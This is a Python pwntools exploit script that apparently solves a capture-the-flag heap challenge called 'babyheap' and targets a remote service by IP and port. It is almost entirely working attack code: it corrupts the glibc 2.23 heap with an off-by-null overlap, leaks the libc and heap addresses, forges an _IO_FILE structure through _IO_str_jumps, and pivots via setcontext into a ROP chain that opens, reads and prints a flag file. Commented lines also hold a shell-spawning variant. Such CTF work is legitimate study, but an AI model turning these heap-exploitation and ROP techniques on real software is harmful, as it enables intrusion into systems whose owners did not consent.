#-*- coding:utf-8 -*-
from pwn_debug.pwn_debug import *
from FILE import *

local=1
pc='./babyheap'
remote_addr=['123.206.174.203',20001]
aslr=True
# context.log_level=True

pdbg = pwn_debug(pc)

pdbg.local("/lib/x86_64-linux-gnu/libc.so.6")
pdbg.debug("2.23")
pdbg.remote(remote_addr[0],remote_addr[1])

if local==1: 
    p = pdbg.run("debug")
    # p = pdbg.run("local")
    # gdb.attach(p,'c')
else:
    p=pdbg.run("remote")

elf=pdbg.elf
libc=pdbg.libc


ru = lambda x : p.recvuntil(x,timeout=0.5)
sn = lambda x : p.send(x)
rl = lambda   : p.recvline()
sl = lambda x : p.sendline(x)
rv = lambda x : p.recv(x)
sa = lambda a,b : p.sendafter(a,b)
sla = lambda a,b : p.sendlineafter(a,b)

def lg(s,addr):
    print('\033[1;31;40m%20s-->0x%x\033[0m'%(s,addr))

def raddr(a=6):
    if(a==6):
        return u64(rv(a).ljust(8,'\x00'))
    else:
        return u64(rl().strip('\n').ljust(8,'\x00'))


def add(size):
    sla("Choice: \n","1")
    sla("Size: ",str(size))

def edit(index,content):
    sla("Choice: \n","2")
    sla("Index: ",str(index))
    sa("Content: ",content)

def delete(index):
    sla("Choice: \n","3")
    sla("Index: ",str(index))

def show(index):
    sla("Choice: \n","4")
    sla("Index: ",str(index))

add(0x18) # 0
add(0x208) # 1
add(0x18) # 2

edit(1,"\x00"*0x1f0 + p64(0x200) + p64(0)) #set fake prev_size
sleep(1)

add(0x18) # 3
add(0x308) # 4
add(0x18) # 5

edit(4,"\x00"*0x2f0 + p64(0x300) + p64(0)) #set fake prev_size
sleep(1)

add(0x18) # 6
add(0x208) # 7
add(0x18) # 8

edit(7,"\x00"*0x1f0 + p64(0x200) + p64(0)) #set fake prev_size
sleep(1)

add(0x18) # 9

# ======leak libc======
delete(1)
edit(0,"\x00"*0x18)
add(0x18) # 1
add(0x1d8) # 10

delete(1)
delete(2) #backward consolidate
sleep(1)

add(0x18) # 1
show(10)
libc_base = raddr() - 0x10 - 88 - libc.symbols['__malloc_hook']
lg("libc_base",libc_base)
_io_list_all = libc_base + libc.symbols['_IO_list_all']
lg("_io_list_all",_io_list_all)
_io_str_jumps = libc_base + libc.symbols['_IO_str_jumps']
lg("_io_str_jumps",_io_str_jumps)
# _io_str_jumps = libc_base + 0x3c37a0
# lg("_io_str_jumps",_io_str_jumps)

add(0x208) # 2
sleep(1)

delete(7)
edit(6,"\x00"*0x18)
add(0x18) # 7
add(0x1d8) # 11

delete(7)
delete(8) #backward consolidate
add(0x18) # 7
sleep(1)

delete(2)
show(10)
heap_base = raddr() - 0x5e0
lg("heap_base",heap_base)

add(0x208) # 2
add(0x208) # 8
sleep(1)

delete(4)
edit(3,"\x00"*0x18)
add(0x18) # 4
add(0x2d8) # 12

delete(4)
delete(5) #backward consolidate

add(0x38)
sleep(1)
#======use _IO_str_jumps======
# context.arch = 'amd64'
# fake_file = IO_FILE_plus_struct()
# fake_file._flags = 0
# fake_file._IO_read_ptr = 0x61
# fake_file._IO_read_base =_io_list_all-0x10
# fake_file._IO_buf_base = libc_base + libc.search("/bin/sh").next()
# fake_file._mode = 0
# fake_file._IO_write_base = 0
# fake_file._IO_write_ptr = 1
# fake_file.vtable = _io_str_jumps-8

# payload = ""
# payload += p64(0)*2
# payload += str(fake_file).ljust(0xe8)
# payload += p64(libc_base + libc.symbols['system']) # can not getshll

# ======use orw read flag======
# setcontext+53
    # 0x00007ffff7a54b75 <+53>:	    mov    rsp,QWORD PTR [rdi+0xa0]
    # 0x00007ffff7a54b7c <+60>:	    mov    rbx,QWORD PTR [rdi+0x80]
    # 0x00007ffff7a54b83 <+67>:	    mov    rbp,QWORD PTR [rdi+0x78]
    # 0x00007ffff7a54b87 <+71>: 	mov    r12,QWORD PTR [rdi+0x48]
    # 0x00007ffff7a54b8b <+75>:	    mov    r13,QWORD PTR [rdi+0x50]
    # 0x00007ffff7a54b8f <+79>: 	mov    r14,QWORD PTR [rdi+0x58]
    # 0x00007ffff7a54b93 <+83>: 	mov    r15,QWORD PTR [rdi+0x60]
    # 0x00007ffff7a54b97 <+87>: 	mov    rcx,QWORD PTR [rdi+0xa8]
    # 0x00007ffff7a54b9e <+94>: 	push   rcx
    # 0x00007ffff7a54b9f <+95>:	    mov    rsi,QWORD PTR [rdi+0x70]
    # 0x00007ffff7a54ba3 <+99>:	    mov    rdx,QWORD PTR [rdi+0x88]
    # 0x00007ffff7a54baa <+106>:	mov    rcx,QWORD PTR [rdi+0x98]
    # 0x00007ffff7a54bb1 <+113>:	mov    r8,QWORD PTR [rdi+0x28]
    # 0x00007ffff7a54bb5 <+117>:	mov    r9,QWORD PTR [rdi+0x30]
    # 0x00007ffff7a54bb9 <+121>:	mov    rdi,QWORD PTR [rdi+0x68]
    # 0x00007ffff7a54bbd <+125>:	xor    eax,eax
    # 0x00007ffff7a54bbf <+127>:	ret    

# debug
# 0x00000000000a8405: syscall; ret;
# 0x0000000000036228: pop rax; ret; 
# 0x0000000000020e22: pop rdi; ret; 
# 0x0000000000001b92: pop rdx; ret;
# 0x0000000000020218: pop rsi; ret;

pop_rax_ret = 0x0000000000036228
pop_rdi_ret = 0x0000000000020e22
pop_rsi_ret = 0x0000000000020218
pop_rdx_ret = 0x0000000000001b92
syscall_ret = 0x00000000000a8405

# 0x0000000000021102: pop rdi; ret;
# 0x0000000000001b92: pop rdx; ret; 
# 0x00000000000202e8: pop rsi; ret; 

# pop_rdi_ret = 0x0000000000021102
# pop_rsi_ret = 0x00000000000202e8
# pop_rdx_ret = 0x0000000000001b92

# 0x00000000001375d0: mov rdi, rax; call qword ptr [rax + 0x20];
# 0x0000000000065bda: mov rdi, rax; call qword ptr [rax + 0x20]; debug
# 0x00000000000895f8: mov rdi, qword ptr [rbx + 0x48]; call qword ptr [rbx + 0x40]; 
# 0x000000000007c168: mov rdi, qword ptr [rbx + 0x48]; call qword ptr [rbx + 0x40];debug



context.arch = 'amd64'
fake_file = IO_FILE_plus_struct()
fake_file._flags = 0
fake_file._IO_read_ptr = 0x61
fake_file._IO_read_base =_io_list_all-0x10
fake_file._IO_buf_base = libc_base + libc.search("/bin/sh").next()
fake_file._IO_buf_end = libc_base + libc.symbols['setcontext'] + 53
fake_file._IO_save_base = heap_base + 0x3a0
fake_file._mode = 0
fake_file._IO_write_base = 0
fake_file._IO_write_ptr = 1
fake_file.vtable = _io_str_jumps-8

payload = ""
payload += p64(0)*2
payload += str(fake_file).ljust(0xe8)
payload += p64(libc_base + 0x000000000007c168)
payload += "\x00"*0xa0
payload += p64(heap_base + 0x3a0 + 0x100)
payload += p64(libc_base + pop_rdi_ret)

payload += "\x00"*0x50
payload += p64(heap_base + 0x530)
payload += p64(libc_base + pop_rsi_ret)
payload += p64(0)
payload += p64(libc_base + libc.symbols['open'])

payload += p64(libc_base + pop_rdi_ret)
payload += p64(4)  # local is 4
payload += p64(libc_base + pop_rsi_ret)
payload += p64(heap_base + 0x30)
payload += p64(libc_base + pop_rdx_ret)
payload += p64(0x100)
payload += p64(libc_base + libc.symbols['read'])

payload += p64(libc_base + pop_rdi_ret)
payload += p64(1)
payload += p64(libc_base + pop_rsi_ret)
payload += p64(heap_base + 0x30)
payload += p64(libc_base + pop_rdx_ret)


payload += p64(0x100)
payload += p64(libc_base + libc.symbols['write'])

payload += "./flag\x00"

edit(12,payload)

pause()

add(0x200)

pause()

print p.recv()
print p.recv()